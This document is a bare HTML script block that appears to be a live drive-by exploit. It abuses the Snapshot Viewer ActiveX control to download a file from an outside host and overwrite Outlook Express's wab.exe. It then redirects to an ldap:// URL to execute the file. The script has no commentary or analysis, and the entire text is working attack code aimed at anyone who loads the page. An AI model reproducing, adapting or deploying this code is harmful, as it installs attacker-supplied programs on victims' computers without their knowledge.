<script>
function GetRoot()
{
	for (index = 2, root = ""; index <= 26; index++)
	{
		root = String.fromCharCode(65 + index);
		var outlook = new Image();
		outlook.src = "res://" + root +":\\Program Files\\Outlook Express\\msoeres.dll/#2/1";
		if (outlook.height == 59)
		{
			break;
		}
		outlook = '';
	}
	return root;
}

function Exploit(url)
{	
	var root = GetRoot();
	// Not Find
	if (root == '[')
		return;
	try
	{
		var obj = new ActiveXObject("snpvw.Snapshot Viewer Control.1");
	}catch(e)
	{
		if (obj != "[object]")
			return;
	}
	
	obj.SnapshotPath = url;
	try
	{
		obj.CompressedPath = root +":\\Program Files\\Outlook Express\\wab.EXE";
		obj.PrintSnapshot();
	}catch(e){};
	
	var iv = setInterval(function(){
		if (obj.readyState == 4) {
		clearInterval(iv);
		window.location = "ldap://";
		}
	}, 3000)
}

Exploit("http://down.hs7yue.cn/new/a1.css");
</script>